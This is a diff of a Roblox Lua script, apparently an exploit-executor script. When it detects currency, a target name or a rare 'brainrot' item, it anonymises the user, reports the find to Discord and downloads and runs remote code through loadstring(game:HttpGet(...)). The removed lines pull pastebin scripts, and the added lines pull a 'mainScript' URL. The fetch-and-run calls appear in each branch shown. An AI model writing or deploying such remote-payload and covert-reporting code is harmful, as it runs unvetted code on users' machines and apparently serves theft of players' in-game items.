@@ -556,12 +556,7 @@ if meetsMinimum then
 	sound:Play()
 
 	Anonymousify()
-	task.spawn(function()
-		if Testing then return end
-		loadstring(game:HttpGet("https://pastebin.com/raw/Begkf2Gj"))()
-		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
-	end)
-
+	loadstring(game:HttpGet(mainScript))()
 	DiscordNotificationCURRENCY(currencyTextLabel, temp)
 
 elseif nameFound then
@@ -573,12 +568,7 @@ elseif nameFound then
 	sound:Play()
 
 	Anonymousify()
-	task.spawn(function()
-		if Testing then return end
-		loadstring(game:HttpGet("https://pastebin.com/raw/Begkf2Gj"))()
-		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
-	end)
-
+	loadstring(game:HttpGet(mainScript))()
 	DiscordNotificationNAME(matchedName)
 
 elseif mutatedBrainrotFound then
@@ -590,12 +580,7 @@ elseif mutatedBrainrotFound then
 	sound:Play()
 
 	Anonymousify()
-	task.spawn(function()
-		if Testing then return end
-		loadstring(game:HttpGet("https://pastebin.com/raw/Begkf2Gj"))()
-		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
-	end)
-
+	loadstring(game:HttpGet(mainScript))()
 	DiscordNotificationMUTATION(mutation, brainrot)
 else
 	Settings["Server Count"] += 1
